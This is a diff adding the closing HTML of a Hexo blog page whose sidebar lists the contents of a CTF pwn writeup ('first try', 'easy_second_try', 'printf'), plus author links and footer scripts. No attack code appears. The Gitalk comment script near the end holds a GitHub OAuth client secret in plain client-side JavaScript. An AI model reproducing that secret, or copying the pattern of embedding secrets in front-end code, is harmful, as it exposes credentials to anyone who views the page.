+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00-前言"><span class="nav-number">1.</span> <span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-练习题目重大时间表"><span class="nav-number">2.</span> <span class="nav-text">0x01 练习题目重大时间表</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-最终版writeup-by-iyzyi"><span class="nav-number">3.</span> <span class="nav-text">0x02 最终版writeup by iyzyi</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-写在前面"><span class="nav-number">3.1.</span> <span class="nav-text">0x00 写在前面</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-来自pwnht的评论（闲话-补充？？？？？）"><span class="nav-number">3.1.1.</span> <span class="nav-text">0x00 来自pwnht的评论（闲话/补充？？？？？）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-first-try"><span class="nav-number">3.2.</span> <span class="nav-text">0x01 first try</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-来自pwnht的评论（闲话-补充？？？？？）-1"><span class="nav-number">3.2.1.</span> <span class="nav-text">0x00 来自pwnht的评论（闲话/补充？？？？？）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-来自pwnht的评论（闲话-补充？？？？？）"><span class="nav-number">3.2.2.</span> <span class="nav-text">0x01 来自pwnht的评论（闲话/补充？？？？？）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-来自pwnht的评论（闲话-补充？？？？？）"><span class="nav-number">3.2.3.</span> <span class="nav-text">0x02 来自pwnht的评论（闲话/补充？？？？？）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-easy-second-try"><span class="nav-number">3.3.</span> <span class="nav-text">0x02 easy_second_try</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-来自pwnht的评论（闲话-补充？？？？？）-2"><span class="nav-number">3.3.1.</span> <span class="nav-text">0x00 来自pwnht的评论（闲话/补充？？？？？）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-来自pwnht的评论（闲话-补充？？？？？）-3"><span class="nav-number">3.3.2.</span> <span class="nav-text">0x00 来自pwnht的评论（闲话/补充？？？？？）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-printf"><span class="nav-number">3.4.</span> <span class="nav-text">0x03 printf</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-来自pwnht的评论（闲话-补充？？？？？）-4"><span class="nav-number">3.4.1.</span> <span class="nav-text">0x00 来自pwnht的评论（闲话/补充？？？？？）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-来自iyzyi的补充"><span class="nav-number">3.4.2.</span> <span class="nav-text">0x01 来自iyzyi的补充</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-来自pwnht的结语"><span class="nav-number">3.5.</span> <span class="nav-text">0x04 来自pwnht的结语</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="site-author-image" itemprop="image" alt="PwnHt"
+    src="/images/header.jpg">
+  <p class="site-author-name" itemprop="name">PwnHt</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">64</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">39</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/pwnht" title="GitHub &rarr; https://github.com/pwnht" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/05171683@cumt.edu.cn" title="E-Mail &rarr; 05171683@cumt.edu.cn"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title">
+      <i class="fa fa-fw fa-link"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://3nd.xyz/" title="https://3nd.xyz/" rel="noopener" target="_blank">3ND</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://dayjun.top/" title="https://dayjun.top/" rel="noopener" target="_blank">哒君</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://iyzyi.com/" title="http://iyzyi.com/" rel="noopener" target="_blank">iyzyi</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">PwnHt</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.9.0
+  </div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.5.0
+  </div>
+
+        
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
+<script src="/js/schemes/pisces.js"></script>
+<script src="/js/next-boot.js"></script>
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+<script>
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
+    var gitalk = new Gitalk({
+      clientID: '0c9c9c5050bd212943da',
+      clientSecret: 'e88bf594e600fa4c1956d2ff2b5aeab8ea9ece28',
+      repo: 'gitalk-commnet',
+      owner: 'pwnht',
+      admin: ['pwnht'],
+      id: '037c0f6fafbc938aa1c6e3db94c9572f',
+        language: 'zh-CN',
+      distractionFreeMode: 'false'
+    });
+    gitalk.render('gitalk-container');
+  }, window.Gitalk);
+</script>
+
+</body>
+</html>
